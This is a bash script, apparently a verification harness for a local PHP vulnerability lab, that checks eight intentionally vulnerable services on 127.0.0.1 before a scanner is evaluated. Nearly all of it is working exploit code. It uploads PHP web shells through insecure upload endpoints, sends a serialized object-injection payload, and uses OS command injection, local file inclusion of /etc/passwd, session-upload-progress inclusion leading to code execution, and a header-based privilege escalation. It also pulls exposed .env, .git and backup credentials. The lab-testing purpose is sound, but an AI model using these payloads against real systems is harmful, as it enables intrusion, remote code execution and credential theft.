#!/usr/bin/env bash
# OPScaner PHP2Shell Lab - exploit verification
# ตรวจว่าทุกพอร์ตยังมีช่องโหว่ PHP2Shell จริง (ใช้ยืนยันก่อนเอาโปรแกรม VA ไปวัดผล)
# ใช้ได้เฉพาะกับ lab ที่รันในเครื่องนี้ (127.0.0.1)
set -uo pipefail
cd "$(dirname "$0")"
LAB=$(pwd)
H=${LAB_HOST:-127.0.0.1}
T=$(mktemp -d)
trap 'rm -rf "$T"' EXIT

pass=0; fail=0
chk() { # name pattern output
  if printf '%s' "$3" | grep -qE "$2"; then
    printf '  \033[32mPASS\033[0m  %s\n' "$1"; pass=$((pass+1))
  else
    printf '  \033[31mFAIL\033[0m  %s\n' "$1"
    printf '        got: %s\n' "$(printf '%s' "$3" | tr -d '\r' | head -c 220 | tr '\n' ' ')"
    fail=$((fail+1))
  fi
}
mk() { printf '<?php echo "%s:".shell_exec($_GET["c"]); ?>' "$2" > "$T/$1"; }

echo "=============================================================="
echo " PHP2Shell lab verification - host $H"
echo "=============================================================="

# ---------------------------------------------------------------- 8081
echo "TARGET #1  CMS (8081)"
mk shell1.php PWN1
curl -s -F "file=@$T/shell1.php;filename=shell1.php" "http://$H:8081/wp-content/plugins/simple-media-upload/upload.php" >/dev/null
chk "upload .php into webroot -> execute" "PWN1:uid=[0-9]+" "$(curl -s "http://$H:8081/wp-content/uploads/shell1.php?c=id")"
chk "version disclosure (/readme.html)" "CorpPress CMS" "$(curl -s "http://$H:8081/readme.html")"

# ---------------------------------------------------------------- 8082
echo "TARGET #2  Framework / API (8082)"
mk shell2.php PWN2
curl -s -X PUT --data-binary @"$T/shell2.php" -H "X-Filename: shell2.php" "http://$H:8082/api/v1/profile/avatar" >/dev/null
chk "unvalidated avatar upload -> execute" "PWN2:uid=[0-9]+" "$(curl -s "http://$H:8082/storage/shell2.php?c=id")"

if command -v php >/dev/null 2>&1; then
  PAYLOAD=$(php -r 'class ReportCache{public $path;public $data;} $o=new ReportCache; $o->path=$argv[1]; $o->data=$argv[2]; echo base64_encode(serialize($o));' \
    "/app/apps/app2/storage/app/public/injected2.php" '<?php echo "PWN2B:".shell_exec($_GET["c"]); ?>')
elif docker ps --format '{{.Names}}' | grep -q "lab-2-api"; then
  PAYLOAD=$(docker exec lab-2-api php -r 'class ReportCache{public $path;public $data;} $o=new ReportCache; $o->path=$argv[1]; $o->data=$argv[2]; echo base64_encode(serialize($o));' \
    "/app/apps/app2/storage/app/public/injected2.php" '<?php echo "PWN2B:".shell_exec($_GET["c"]); ?>')
else
  PAYLOAD="TzoxMToiUmVwb3J0Q2FjaGUiOjI6e3M6NDoicGF0aCI7czo0NzoiL2FwcC9hcHBzL2FwcDIvc3RvcmFnZS9hcHAvcHVibGljL2luamVjdGVkMi5waHAiO3M6NDoiZGF0YSI7czo0NjoiPD9waHAgZWNobyAiUFdOMkI6Ii5zaGVsbF9leGVjKCRfR0VUWyJjIl0pOyA/PiI7fQ=="
fi
curl -s -X POST --data-urlencode "payload=$PAYLOAD" "http://$H:8082/api/v1/import" >/dev/null
chk "unserialize() object injection -> write + execute" "PWN2B:uid=[0-9]+" "$(curl -s "http://$H:8082/storage/injected2.php?c=id")"
chk ".env served from webroot" "DB_PASSWORD=" "$(curl -s "http://$H:8082/.env")"

# ---------------------------------------------------------------- 8083
echo "TARGET #3  Hosting control panel (8083)"
mk shell3.php PWN3
curl -s -F "tenant=demo" -F "file=@$T/shell3.php;filename=shell3.php;type=image/png" "http://$H:8083/panel/filemanager/upload" >/dev/null
chk "MIME-only upload check -> execute in tenant docroot" "PWN3:uid=[0-9]+" "$(curl -s "http://$H:8083/home/demo/public_html/shell3.php?c=id")"
chk "client role header -> panel API (priv-esc)" "root_api_token" "$(curl -s -H "X-Role: reseller" "http://$H:8083/panel/api/accounts")"

# ---------------------------------------------------------------- 8084
echo "TARGET #4  Appliance / IoT (8084)"
chk "OS command injection (diag.php)" "uid=[0-9]+" "$(curl -s "http://$H:8084/diag.php?target=127.0.0.1;id&format=json")"
chk "OS command injection (status.cgi)" "uid=[0-9]+" "$(curl -s "http://$H:8084/cgi-bin/status.cgi?iface=eth0;id")"
mk shell4.php PWN4
curl -s -F "pkg=@$T/shell4.php;filename=shell4.php" "http://$H:8084/firmware_upgrade" >/dev/null
chk "unsigned firmware upload -> execute" "PWN4:uid=[0-9]+" "$(curl -s "http://$H:8084/firmware/shell4.php?c=id")"

# ---------------------------------------------------------------- 8085
echo "TARGET #5  Container image (8085)"
mk shell5.php PWN5
curl -s -F "file=@$T/shell5.php;filename=shell5.php" "http://$H:8085/api/upload/attachments" >/dev/null
chk "upload in image -> execute in bind-mounted volume" "PWN5:uid=[0-9]+" "$(curl -s "http://$H:8085/public/storage/shell5.php?c=id")"
chk "container/escape config disclosure" "docker.sock" "$(curl -s "http://$H:8085/config/Dockerfile")"

# ---------------------------------------------------------------- 8086
echo "TARGET #6  Windows / IIS (8086)"
mk shell6.php PWN6
curl -s -F "file=@$T/shell6.php;filename=shell6.php.jpg" "http://$H:8086/portal/upload.aspx" >/dev/null
chk "double extension (.php.jpg) -> executes via *.jpg handler" "PWN6:uid=[0-9]+" "$(curl -s "http://$H:8086/uploads/shell6.php.jpg?c=id")"
chk "cmd.exe injection (systeminfo)" "uid=[0-9]+" "$(curl -s "http://$H:8086/portal/systeminfo.aspx?cmd=dir;id&format=json")"

# ---------------------------------------------------------------- 8087
echo "TARGET #7  Legacy staging (8087)"
chk "phpinfo() exposed" "PHP Version" "$(curl -s "http://$H:8087/phpinfo.php" | grep -o "PHP Version [0-9.]*" | head -1)"
chk ".git exposed" "refs/heads" "$(curl -s "http://$H:8087/.git/HEAD")"
chk "backup config exposed (credentials)" "DATABASE_PASSWORD=" "$(curl -s "http://$H:8087/backup/config.old.txt")"
chk "LFI reads host file" "root:.*:0:0:" "$(curl -s "http://$H:8087/?page=/etc/passwd")"
curl -s -b "PHPSESSID=lab7poc" \
     --form-string 'PHP_SESSION_UPLOAD_PROGRESS=<?php echo "PWN7:".shell_exec($_GET["c"]); ?>' \
     -F "f=@$T/shell1.php" "http://$H:8087/upload_progress.php" >/dev/null
chk "session-upload-progress + LFI -> RCE (no upload needed)" "PWN7:uid=[0-9]+" \
    "$(curl -s -b "PHPSESSID=reader7" "http://$H:8087/?page=/tmp/sess_lab7poc&c=id")"

# ---------------------------------------------------------------- 8088
echo "TARGET #8  Shared hosting (8088)"
mk shell8.php PWN8
curl -s -F "file=@$T/shell8.php;filename=shell8.php" "http://$H:8088/upload.php?tenant=tenant_a" >/dev/null
chk "shared upload dir -> execute" "PWN8:uid=[0-9]+" "$(curl -s "http://$H:8088/uploads/shell8.php?c=id")"
chk "cross-tenant traversal reads other tenant config" "T3nantB_Crm" "$(curl -s "http://$H:8088/download.php?tenant=tenant_a&file=../tenant_b/config.php")"

echo "--------------------------------------------------------------"
printf ' RESULT: %d passed, %d failed\n' "$pass" "$fail"
echo "--------------------------------------------------------------"
[ "$fail" -eq 0 ] || exit 1
